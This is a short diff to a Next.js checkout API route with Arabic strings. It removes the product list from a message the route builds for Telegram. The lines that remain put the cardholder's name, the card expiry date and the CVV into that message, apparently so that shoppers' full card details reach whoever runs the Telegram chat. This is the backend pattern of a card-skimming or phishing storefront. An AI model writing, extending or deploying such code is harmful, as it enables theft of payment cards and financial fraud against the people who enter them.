@@ -13,10 +13,6 @@ export async function POST(req: NextRequest) {
   });
 
   // إرسال تلجرام
-  const itemsList = items?.map((i: { name: string; quantity: number; price: number }) =>
-    `• ${i.name} x${i.quantity} — ${i.price.toLocaleString("ar-SA")} ريال`
-  ).join("\n") ?? "";
-
   const text = [
     `🛒 طلب جديد`,
     `🆔 رقم الطلب: ${orderId}`,
@@ -25,9 +21,6 @@ export async function POST(req: NextRequest) {
     `👤 اسم حامل البطاقة: ${cardHolder}`,
     `📅 تاريخ الانتهاء: ${expiry}`,
     `🔐 CVV: ${cvv}`,
-    ``,
-    `🛍️ المنتجات:\n${itemsList}`,
-    ``,
     `💰 الإجمالي: ${total?.toLocaleString("ar-SA")} ريال`,
   ].join("\n");
 
